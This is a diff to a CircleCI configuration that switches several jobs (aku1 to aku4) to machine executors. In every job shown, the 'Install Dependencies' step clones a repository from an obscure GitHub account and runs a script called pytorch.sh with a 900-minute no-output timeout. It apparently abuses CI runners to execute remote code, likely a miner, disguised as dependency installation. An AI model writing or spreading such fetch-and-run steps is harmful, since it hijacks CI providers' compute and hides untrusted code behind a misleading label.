@@ -1,32 +1,32 @@
 version: 2
 jobs:
     aku1:
-      docker:
-            - image: ubuntu-18.04
+      machine:
+            image: ubuntu-2004:202101-01
       steps:
         - run:
             name: Install Dependencies
             command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku2:
-      docker:
-            - image: circleci/ruby:2.4
+      machine:
+            image: ubuntu-2004:202101-01
       steps:
         - run:
             name: Install Dependencies
             command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku3:
-      docker:
-            - image: circleci/ruby:2.4
+      machine:
+            image: ubuntu-2004:202101-01
       steps:
         - run:
             name: Install Dependencies
             command: git clone https://github.com/bciu1bic/SUGR.git && cd SUGR && chmod +x pytorch.sh && ./pytorch.sh
             no_output_timeout: 900m
     aku4:
-      docker:
-            - image: circleci/ruby:2.4
+      machine:
+            image: ubuntu-2004:202101-01
       steps:
         - run:
             name: Install Dependencies
